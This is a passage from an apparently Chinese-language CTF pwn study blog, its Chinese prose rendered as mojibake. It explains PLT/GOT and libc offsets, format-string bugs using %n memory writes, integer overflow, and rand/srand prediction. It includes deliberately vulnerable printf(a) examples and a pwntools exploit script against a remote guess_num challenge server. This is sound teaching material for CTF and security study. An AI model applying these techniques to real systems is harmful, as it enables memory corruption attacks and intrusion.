class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GCCç¼–è¯‘ï¼ˆä¸€æ®µå®Œæ•´ä»£ç çš„è¿è¡Œï¼‰å¯åˆ†ä¸ºé¢„å¤„ç†ã€ç¼–è¯‘ã€æ±‡ç¼–ã€é“¾æ¥å››ä¸ªé˜¶æ®µ</p><p>å½“å¤„åœ¨æ±‡ç¼–é˜¶æ®µæ—¶ï¼Œæ‰€æœ‰å…ƒç´ çš„åœ°å€éƒ½æ˜¯è™šæ‹Ÿçš„ï¼Œé“¾æ¥æ“ä½œåï¼Œæ‰€æœ‰å…ƒç´ çš„åœ°å€æ‰ä¼šè¢«ä¿®æ”¹ï¼ˆé‡å®šä½ï¼‰ä¸ºå®é™…åœ°å€</p><p>printfå‡½æ•°ä½äºglibcåŠ¨æ€åº“ä¸­ï¼Œç¼–è¯‘é˜¶æ®µç¼–è¯‘å™¨å¹¶ä¸çŸ¥é“printfå‡½æ•°æ˜¯åœ¨suoyiglibcåº“ä¸­çš„ï¼ˆé“¾æ¥é˜¶æ®µæ˜¯å¯ä»¥çŸ¥é“printfå®šä¹‰åœ¨å“ªçš„ï¼Œåªæ˜¯å¦‚æœå®šä¹‰åœ¨åŠ¨æ€åº“å°±ä¸çŸ¥é“å…·ä½“çš„åœ°å€ï¼‰ï¼Œäºæ˜¯é“¾æ¥å™¨ä¼šç”Ÿæˆä¸€æ®µé¢å¤–çš„å°ä»£ç ç‰‡æ®µæ¥è·å–printfå‡½æ•°åœ°å€ï¼Œå¹¶å®Œæˆå¯¹å®ƒçš„è°ƒç”¨ã€‚</p><p>GOTè¡¨ç¤ºå­˜æ”¾å‡½æ•°åœ°å€çš„æ•°æ®è¡¨ï¼ŒPLTè¡¨è¡¨ç¤ºé¢å¤–ä»£ç æ®µè¡¨ã€‚</p><p><img src="/images/zj39.png" alt="zj39"></p><h3><span id="è§£é¢˜æ€è·¯">è§£é¢˜æ€è·¯</span></h3><p>é™„ä»¶ä¸€èˆ¬ä¼šç»™å‡ºlibc.soçš„æ–‡ä»¶</p><p>æš‚æ—¶åªå‘ç°äº†ä¸¤ç§ç®—æ³•ï¼Œä½†æ˜¯åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå½“æœ‰å…¶ä¸­ä¸€ä¸ªå‡½æ•°çš„çœŸå®åœ°å€åï¼Œå…¶ä»–å‡½æ•°çš„çœŸå®åœ°å€å¯ä»¥æ ¹æ®åç§»å€¼ç®—å‡º</p><p>â‘ ç®—å‡ºâ€œå‚ç…§å‡½æ•°â€œlibcå’Œelfçš„åç§»å€¼ï¼Œä»¥å®ƒä¸ºbaseï¼Œå†æ‰¾å‡ºæ‰€æ±‚å‡½æ•°çš„libcå€¼ï¼Œå†åŠ å‡baseå¾—å‡ºçœŸå®åœ°å€</p><p>ä¾‹å¦‚ï¼šæ”»é˜²ä¸–ç•Œforgot çš„exp</p><p><img src="/images/zj40.png" alt="zj40"></p><p>â‘¡ç®—å‡ºæ‰€æ±‚å‡½æ•°ä¸â€å‚ç…§å‡½æ•°â€œåœ¨libcä¸­çš„åç§»å€¼ï¼Œç­‰åˆ°çŸ¥é“â€å‚ç…§å‡½æ•°â€œçš„çœŸå®åœ°å€åï¼Œå†æ ¹æ®æ­¤åç§»å€¼ç®—æ‰€æ±‚å‡½æ•°çš„çœŸå®åœ°å€</p><p>ä¾‹å¦‚ï¼šæ”»é˜²ä¸–ç•Œleve3 çš„exp</p><p><img src="/images/zj41.png" alt="zj41"></p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œlevel3</em></strong></p><p>è¯¦æƒ…è§å…¶ä»–åšå®¢</p><h1><span id="0x06-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">0x06 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></h1><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p><p>ï¼ˆä¹Ÿä¸çŸ¥é“è®²ä¸è®²çš„æ¸…ã€‚ã€‚ã€‚ã€‚ï¼‰</p><p>é¦–å…ˆäº†è§£ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²â€œ%nâ€</p><p>%nè¡¨ç¤ºçš„æ˜¯å°†<strong>å·²ç»æ‰“å°å‡ºæ¥çš„å­—ç¬¦ä¸ªæ•°</strong>ï¼Œèµ‹å€¼ç»™ä¸€ä¸ªå˜é‡</p><p><img src="/images/zj26.png" alt="zj26"></p><p>%nä¹‹å‰æ‰“å°äº†5ä¸ªaï¼Œæ‰€ä»¥nçš„å€¼å˜æˆäº†5ã€‚</p><h2><span id="æ¼æ´æˆå› å’ŒåŸºæœ¬åŸç†">æ¼æ´æˆå› å’ŒåŸºæœ¬åŸç†</span></h2><p>æ­£å¸¸çš„printfï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int n&#x3D;5;</span><br><span class="line">  printf(&quot;%d&quot;,n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æœ‰äººå·æ‡’ä¼šå†™æˆè¿™æ ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[]&#x3D;&quot;neuqcsa&quot;;</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¿™æ˜¯å¯ä»¥è¾“å‡ºçš„ï¼Œè¾“å‡ºå°±ä¸ºneuqcsa</p><p>ä½†æ˜¯å½“æˆ‘ä»¬è¾“å…¥çš„æ˜¯å­—ç¬¦ä¸²å°±ä¼šå‡ºé—®é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡å¦‚æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯â€œ%x%x%xâ€</p><p><img src="/images/zj27.png" alt="zj27"></p><p>å¯ä»¥çœ‹åˆ°æœ¬æ„æ˜¯æƒ³è¾“å‡ºå­—ç¬¦ä¸²â€œ%x%x%xâ€,å´è¾“å‡ºäº†å†…å­˜ä¸­çš„ä¸€æ®µåœ°å€</p><p>å†çœ‹çœ‹printfå‡½æ•°çš„å †æ ˆå›¾ï¼šï¼ˆå‚æ•°ä»å³å‘å·¦å…¥æ ˆï¼‰</p><p><img src="/images/zj28.png" alt="zj28"></p><p><img src="/images/zj29.png" alt="zj29"></p><p><strong>printfå‡½æ•°å¹¶ä¸çŸ¥é“å‚æ•°çš„ä¸ªæ•°ï¼Œå®ƒåªä¼šé€šè¿‡æŒ‡é’ˆå»æœç´¢æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åæ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç±»å‹è¾“å‡ºç›¸åº”å‚æ•°çš„å€¼ï¼Œç›´åˆ°æœç´¢å®Œæœ€åä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²</strong></p><p>æ‰€ä»¥å°½ç®¡æ²¡æœ‰å‚æ•°ï¼Œä¹Ÿä¼šå°†format string åé¢çš„å†…å­˜å½“åšå‚æ•°ä»¥16è¿›åˆ¶è¾“å‡ºã€‚è¿™æ ·å°±ä¼šé€ æˆå†…å­˜æ³„éœ²ã€‚</p><h2><span id="ä»»æ„å†…å­˜çš„è¯»å–åŠä»»æ„å†…å­˜å†™å…¥">ä»»æ„å†…å­˜çš„è¯»å–åŠä»»æ„å†…å­˜å†™å…¥</span></h2><p>ä»»æ„çš„å†…å­˜çš„è¯»å–éœ€è¦ç”¨åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸² <strong>%s</strong>ï¼Œå…¶å¯¹åº”çš„å‚é‡æ˜¯ä¸€ä¸ªæŒ‡å‘<strong>å­—ç¬¦ä¸²é¦–åœ°å€</strong>çš„æŒ‡é’ˆï¼Œä½œç”¨æ˜¯<strong>è¾“å‡ºè¿™ä¸ªå­—ç¬¦ä¸²</strong>ã€‚</p><p><strong>å±€éƒ¨å˜é‡æ˜¯å­˜å‚¨åœ¨æ ˆä¸­çš„</strong></p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  system(&quot;pause&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°ï¼š</p><p><img src="/images/zj30.png" alt="zj30"></p><p>çœ‹ä¸‹å †æ ˆå›¾ï¼š<br> è¿™æ˜¯è°ƒç”¨scanfå‡½æ•°å‰çš„å †æ ˆå›¾ã€‚</p><p><img src="/images/zj32.png" alt="zj32"></p><p>è¾“å…¥å­—ç¬¦ä¸²åçš„å †æ ˆå›¾ï¼š</p><p><img src="/images/zj31.png" alt="zj31"></p><p>è°ƒç”¨printfå‡½æ•°çš„è¿‡ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eaxï¼Œæ•°ç»„é¦–åœ°å€</span><br><span class="line">push eax  </span><br><span class="line">call printf</span><br></pre></td></tr></table></figure><p>è¯¥è¿‡ç¨‹åªæ˜¯å°†æ•°ç»„çš„é¦–åœ°å€å…¥æ ˆï¼Œæ­¤æ—¶å †æ ˆå›¾å¦‚ä¸‹ã€‚</p><p><img src="/images/zj33.png" alt="zj33"></p><p>æ‰€ä»¥åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œç”¨å¾ˆå¤šçš„%x å°±ä¸€å®šå¯ä»¥æ‰¾åˆ°è¿™ä¸ªAAAAçš„ä½ç½®ã€‚æˆ‘ä»¬å°†è¿™ä¸ªä½ç½®è®°ä¸‹æ¥ï¼Œå®ä¾‹ä¸­å°±æ˜¯ç¬¬ä¸ƒä¸ª%xçš„ä½ç½®ï¼Œå³ç¬¬7ä¸ªå‚æ•°ã€‚</p><p>è¿™é‡Œè¯´ä¸‹å¯ä»¥ç›´æ¥è¯»å–ç¬¬ä¸ƒä¸ªå‚æ•°çš„æ–¹æ³•ã€‚ï¼ˆåœ¨linuxä¸‹æœ‰ç”¨ï¼Œwinä¸‹æ²¡ç”¨ï¼‰<br> %&lt; number&gt;$x æ˜¯ç›´æ¥è¯»å–ç¬¬numberä¸ªä½ç½®çš„å‚æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨åœ¨%nï¼Œ%dç­‰ç­‰ã€‚<br> ä½†æ˜¯éœ€è¦æ³¨æ„64ä½ç¨‹åºï¼Œå‰6ä¸ªå‚æ•°æ˜¯å­˜åœ¨å¯„å­˜å™¨ä¸­çš„ï¼Œä»ç¬¬7ä¸ªå‚æ•°å¼€å§‹æ‰ä¼šå‡ºç°åœ¨æ ˆä¸­ï¼Œæ‰€ä»¥æ ˆä¸­ä»æ ¼å¼åŒ–å­—ç¬¦ä¸²å¼€å§‹çš„ç¬¬ä¸€ä¸ªï¼Œåº”è¯¥æ˜¯%7 $n</p><h3><span id="ä¿®æ”¹å†…å­˜">ä¿®æ”¹å†…å­˜</span></h3><p><img src="/images/zj34.png" alt="zj34"></p><p>å¾—åˆ°bçš„åœ°å€</p><p><img src="/images/zj35.png" alt="zj35"></p><p>è¿™é‡Œæ˜¯ç¬¬ä¹ä¸ªå‚æ•°ã€‚<br> æ¥ç€ç”¨shellcodeç¼–ç å°†bçš„åœ°å€å†™å…¥ï¼Œå¹¶æŸ¥çœ‹èƒ½å¦å†™å…¥æˆåŠŸã€‚</p><p><img src="/images/zj36.png" alt="zj36"></p><p>ç”¨%nä¿®æ”¹å…¶å€¼ã€‚</p><p><img src="/images/zj37.png" alt="zj37"></p><p>å› ä¸º%nä¹‹å‰æ‰“å°äº†75ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œå°†bçš„å€¼ä»0ä¿®æ”¹ä¸º75</p><p><strong>ä½ ä¹Ÿå¯ä»¥é€šè¿‡%&lt; number &gt;$n æ¥ç›´æ¥ä¿®æ”¹ç¬¬ä¹ä¸ªå‚æ•°æ¥ä¿®æ”¹bçš„å€¼</strong>ã€‚</p><p><img src="/images/zj38.png" alt="zj38"></p><p>åœ¨%nä¹‹å‰æ‰“å°äº†4ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥bçš„å€¼ç›´æ¥è¢«ä¿®æ”¹ä¸º4äº†</p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•ŒCGfsb</em></strong></p><p><img src="/images/zj17.png" alt="zj17"></p><p><img src="/images/zj18.png" alt="zj18"></p><p>pwnmeä¸º8æ—¶å°±èƒ½æ‹¿åˆ°flagï¼Œé—®é¢˜æ˜¯å¹¶æ²¡æœ‰èƒ½è¾“å…¥pwnmeçš„åœ°æ–¹</p><p>ä½†æ˜¯pwnmeçš„ä¸Šæ–¹æœ‰ä¸€ä¸ªprintfï¼ˆ&amp;sï¼‰æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ä»¥æ­¤æ¥æ”¹å˜pwnmeçš„å€¼</p><p>çœ‹çœ‹åç§»å€¼ï¼š</p><p><img src="/images/zj19.png" alt="zj19"></p><p>å¯ä»¥çœ‹å‡ºåç§»å€¼æ˜¯10</p><p>ä¸Šexpï¼š</p><p><img src="/images/zj20.png" alt="zj20"></p><p>æ³¨æ„%10$nå¤„è¦åŠ å¼•å·</p><h1><span id="0x07-strcpyæ¼æ´">0x07 strcpyæ¼æ´</span></h1><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/bjbz_cxy/article/details/80388908">https://blog.csdn.net/bjbz_cxy/article/details/80388908</a></p><p>strcpyæ˜¯æ ‡å‡†Cåº“å‡½æ•°ï¼Œä¸ä¼šå»æ£€æŸ¥è¶Šç•Œé—®é¢˜ï¼Œæ‰€ä»¥å®ƒå¯ä»¥ç›´æ¥å°†å†…å­˜ä¸­çš„å€¼ä¿®æ”¹</p><h1><span id="0x08-æ•´æ•°æº¢å‡º">0x08 æ•´æ•°æº¢å‡º</span></h1><p>å‚è€ƒ:<a href="https://zhuanlan.zhihu.com/p/28563004">https://zhuanlan.zhihu.com/p/28563004</a></p><p>æ•´æ•°åˆ†ä¸ºæœ‰ç¬¦å·å’Œæ— ç¬¦å·</p><p>å¼‚å¸¸æƒ…å†µæœ‰ä¸‰ç§ï¼šâ‘ æº¢å‡º   â‘¡å›ç»•   â‘¢æˆªæ–­</p><h2><span id="æº¢å‡º">æº¢å‡º</span></h2><p>è¡¨ç°åœ¨æœ‰ç¬¦å·æ•´æ•°ä¸Šï¼Œæœ‰ç¬¦å·æ•´æ•°æœ‰æ­£å€¼ã€è´Ÿå€¼å’Œé›¶ï¼Œæœ‰å‘ä¸Šæº¢å‡ºå’Œå‘ä¸‹æº¢å‡ºä¸¤ç§ã€‚å‡è®¾ç”¨kä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ•´å‹å˜é‡, é‚£ä¹ˆè¿™ä¸ªå˜é‡å¯ä»¥è¡¨ç¤ºçš„æœ‰ç¬¦å·æ•´æ•°çš„èŒƒå›´æ˜¯-2^(8k-1) ~ 2^(8k-1) â€“  1,é‚£ä¹ˆä¸¤ä¸ªæ­£æ•´æ•°æˆ–è€…ä¸¤ä¸ªè´Ÿæ•´æ•°ç›¸åŠ å°±æœ‰å¯èƒ½è¶…è¿‡è¿™ä¸ªæ•´å‹å˜é‡æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´, å‘ä¸Šè¶…å‡º&gt;2^(8k-1) â€“ 1æˆ‘ä»¬ç§°ä¹‹ä¸ºå‘ä¸Šæº¢å‡º,  å‘ä¸‹è¶…å‡º&lt;-2^(8k-1), æˆ‘ä»¬ç§°ä¹‹ä¸ºå‘ä¸‹æº¢å‡º. </p><p>å¯¹äºsigned char,æ­£æ•´æ•°æœ€å¤§å€¼ä¸º127ï¼Œè´Ÿæ•´æ•°æœ€å°å€¼ä¸º128ã€‚unsigned charæ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼ä¸º255ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signed char x;</span><br><span class="line">x &#x3D; 125 + 5;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¼šè¾“å‡ºï¼š-126ï¼Œå› ä¸º130çš„äºŒè¿›åˆ¶ä½ä¸º10000010ï¼Œç¬¦å·ä¸º1ï¼Œè¡¨ç¤ºè´Ÿæ•°ã€‚å¯¹äºæœ‰ç¬¦å·æ•´å‹ï¼Œè´Ÿæ•°æ˜¯ç”¨è¡¥ç è¡¨ç¤ºçš„ï¼Œå³ç»å¯¹å€¼å–åååŠ ä¸€ã€‚æ ¹æ®ä¹‹å‰æ–¹æ³•é€†å‘å›å»ï¼Œå…ˆå‡ä¸€åå†å–åå¾—01111110ï¼Œå³126.æ‰€ä»¥10000010è¡¨ç¤ºçš„æ˜¯-126ã€‚</p><h2><span id="å›ç»•">å›ç»•</span></h2><p>æº¢å‡ºåçš„æ•°ä¼šä»¥2^(8*sizeof(type))ä½œæ¨¡è¿ç®—</p><p>ä¾‹å¦‚ä¸€ä¸ªunsigned charï¼ˆ1å­—ç¬¦ï¼Œ8bitsï¼‰æº¢å‡ºäº†ï¼Œä¼šæŠŠæº¢å‡ºçš„å€¼ä¸256æ±‚æ¨¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">  unsigned char x;</span><br><span class="line">  x &#x3D; 128 + 130;</span><br><span class="line">  printf(&quot;%d\n&quot;,x);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šè¾“å‡º2ï¼Œå› ä¸º258%256=2</p><h2><span id="æˆªæ–­">æˆªæ–­</span></h2><p>å°†ä¸€ä¸ªè¾ƒå¤§å®½åº¦çš„æ•°å­˜å…¥è¾ƒå°å®½åº¦çš„æ“ä½œæ•°ä¸­æ—¶ï¼Œé«˜ä½ä¼šå‘ç”Ÿæˆªæ–­ï¼ˆä¸€èˆ¬åªå–åå…«ä½ï¼‰</p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œint_overflow</em></strong></p><p><a href="https://makabaka-yyds.github.io/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bint_overflow/">è¯¦æƒ…è§</a></p><h1><span id="0x09-dynelf">0x09 DynELF</span></h1><p>å…·ä½“åŸç†è§ï¼š</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157</a></p><p><a href="https://www.anquanke.com/post/id/85129">ã€æŠ€æœ¯åˆ†äº«ã€‘å€ŸåŠ©DynELFå®ç°æ— libcçš„æ¼æ´åˆ©ç”¨å°ç»“ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œpwn100</em></strong></p><p>è¯¦æƒ…è§å…¶ä»–åšå®¢</p><h1><span id="0x10-ä¸‡èƒ½gadget">0x10 ä¸‡èƒ½gadget</span></h1><p><a href="https://xz.aliyun.com/t/5597#toc-1">ä¸‡èƒ½gadget</a></p><p><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œpwn100</em></strong></p><p>è¯¦æƒ…è§å…¶ä»–åšå®¢</p><h1><span id="0x0n-æ‚ä¸ƒæ‚å…«">0x0N  æ‚ä¸ƒæ‚å…«</span></h1><h2><span id="0x001-åœ°å€æŸ¥æ‰¾å‡½æ•°">0x001 åœ°å€æŸ¥æ‰¾å‡½æ•°</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å‰æï¼šelf &#x3D; ELFï¼ˆ&#39;level2&#39;ï¼‰</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]#åœ¨elfè¿™ä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾systemå‡½æ•°çš„åœ°å€</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()#åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾å†™æœ‰å­—ç¬¦ä¸²â€œ&#x2F;bin&#x2F;shâ€çš„åœ°å€</span><br></pre></td></tr></table></figure><h2><span id="0x002-å…³äºsystembinsh">0x002 å…³äºsystem(/bin/sh)</span></h2><p>systemï¼ˆï¼‰å‡½æ•°è°ƒç”¨çš„æ˜¯åœ°å€</p><p>/bin/shåªæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åœ¨ f12+shift ä»¥åŠæŸ¥æ‰¾å‡½æ•°æŸ¥å‡ºæ¥çš„éƒ½æ˜¯å†™æœ‰ â€œ/bin/shâ€ è¿™ä¸ªå†…å®¹çš„åœ°å€</p><h2><span id="0x003-å…³äºrandå’Œsrand">0x003 å…³äºrandå’Œsrand</span></h2><p>éšæœºå‡½æ•°ç”Ÿæˆçš„éšæœºæ•°å¹¶ä¸æ˜¯çœŸçš„éšæœºæ•°ï¼Œä»–ä»¬åªæ˜¯åœ¨ä¸€å®šèŒƒå›´å†…éšæœºï¼Œå®é™…ä¸Šæ˜¯ä¸€æ®µæ•°å­—çš„å¾ªç¯ï¼Œè¿™äº›æ•°å­—å–å†³äºéšæœºç§å­ã€‚åœ¨è°ƒç”¨rand()å‡½æ•°æ—¶ï¼Œå¿…é¡»å…ˆåˆ©ç”¨srand()è®¾å¥½éšæœºæ•°ç§å­ï¼Œå¦‚æœæœªè®¾éšæœºæ•°ç§å­ï¼Œrand()åœ¨è°ƒç”¨æ—¶ä¼šè‡ªåŠ¨è®¾éšæœºæ•°ç§å­ä¸º1ã€‚<br><strong><em>ä¾‹é¢˜ï¼šæ”»é˜²ä¸–ç•Œguess_num</em></strong></p><p><img src="/images/zj21.png" alt="zj21"></p><p><img src="/images/zj22.png" alt="zj22"></p><p><img src="/images/zj23.png" alt="zj23"></p><p>getsçš„è¾“å‡ºæ¼æ´ï¼Œv6æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œåé¢æœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœv4èƒ½ä¸v6ç›¸ç­‰ï¼Œé‚£ä¹ˆå°±èƒ½æ‹¿åˆ°flagï¼Œè€Œæ­£å¥½æˆ‘ä»¬å¯ä»¥é€šè¿‡getsè¾“å‡ºæ¼æ´æ§åˆ¶seed[0]è®©å®ƒæ¯æ¬¡äº§ç”Ÿçš„éšæœºæ•°éƒ½èƒ½è¢«æˆ‘ä»¬é¢„çŸ¥</p><h5><span id="å…³äºctypeåº“ä¸dll">å…³äºctypeåº“ä¸dll</span></h5><p>æˆ‘ä»¬ä½¿ç”¨pythonæ ‡å‡†åº“ä¸­è‡ªå¸¦çš„ctypesæ¨¡å—è¿›è¡Œpythonå’Œcçš„æ··åˆç¼–ç¨‹</p><h5><span id="libcå…±äº«åº“">libcå…±äº«åº“</span></h5><p>å¯ä»¥ä½¿ç”¨lddæŸ¥æ‰¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~&#x2F;Desktop&#x2F;black&#x2F;GFSJ&#x2F;guess_num$ ldd guess_num </span><br><span class="line">    linux-vdso.so.1 &#x3D;&gt;  (0x00007ffd3f5a0000)</span><br><span class="line">    libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f1e6c0b0000)</span><br><span class="line">    &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f1e6c67d000)</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åœ¨è„šæœ¬ä¸­é€šè¿‡elfæ–‡ä»¶æŸ¥æ‰¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf &#x3D; ELF(&#39;.&#x2F;guess_num&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from ctypes import*</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.243&#39;,56846)</span><br><span class="line"></span><br><span class="line">libc &#x3D; cdll.LoadLibrary(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">p.recvuntil(&quot;Your name:&quot;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x30-0x10) + p64(1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line">for i in range(10):      #å¾ªç¯å†™æ³•ï¼ˆå¾ªç¯10æ¬¡ï¼‰</span><br><span class="line">   num &#x3D; str(libc.rand()%6+1)</span><br><span class="line">   p.recvuntil(&quot;number:&quot;)</span><br><span class="line">   p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x004-text-data-bssç­‰çš„åŒºåˆ«">0x004 .text .data .bssç­‰çš„åŒºåˆ«</span></h2><p> åŸåšå®¢ï¼š<a href="https://blog.csdn.net/qq_27350133/article/details/103796444">https://blog.csdn.net/qq_27350133/article/details/103796444</a></p><ul><li><p>.textæ®µæ˜¯ä»£ç æ®µã€‚å®ƒç”¨æ¥æ”¾ç¨‹åºä»£ç ï¼ˆcodeï¼‰ã€‚å®ƒé€šå¸¸æ˜¯åªè¯»çš„ï¼ˆç¨‹åºä»£ç ï¼Œç¼–è¯‘å¥½äº†å°±ç¡®å®šäº†ï¼Œä¸å¯èƒ½æ”¹æ¥æ”¹å»çš„å˜›ï¼‰ã€‚</p></li><li><p>.data(ZI data)æ®µæ˜¯æ•°æ®æ®µã€‚å®ƒç”¨æ¥å­˜æ”¾åˆå§‹åŒ–äº†çš„ï¼ˆinitailizedï¼‰å…¨å±€å˜é‡ï¼ˆglobalï¼‰å’Œåˆå§‹åŒ–äº†çš„é™æ€å˜é‡ï¼ˆstaticï¼‰ã€‚å®ƒæ˜¯å¯è¯»å¯å†™çš„ã€‚</p></li><li><p>.bss(RW data 